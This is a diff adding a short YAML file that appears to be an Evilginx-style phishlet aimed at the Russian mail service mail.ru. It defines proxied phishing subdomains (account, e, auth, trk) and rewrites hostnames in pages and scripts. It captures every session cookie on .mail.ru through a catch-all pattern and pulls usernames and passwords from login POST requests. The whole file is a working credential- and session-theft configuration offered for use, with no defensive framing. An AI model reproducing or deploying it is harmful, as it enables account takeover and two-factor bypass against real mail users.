@@ -1,0 +1,26 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'mail.ru', session: true}
+  - {phish_sub: 'e', orig_sub: 'e', domain: 'mail.ru', session: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'mail.ru', session: true}
+  - {phish_sub: 'trk', orig_sub: 'trk', domain: 'mail.ru', session: true}
+sub_filters:
+  - {triggers_on: 'mail.ru', orig_sub: '', domain: 'mail.ru', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.mail.ru'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/inbox/.*'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+    
+login:
+  domain: 'account.mail.ru'
+  path: '/login?page=https%3A%2F%2Fe.mail.ru%2Finbox&allow_external=1&from=octavius'
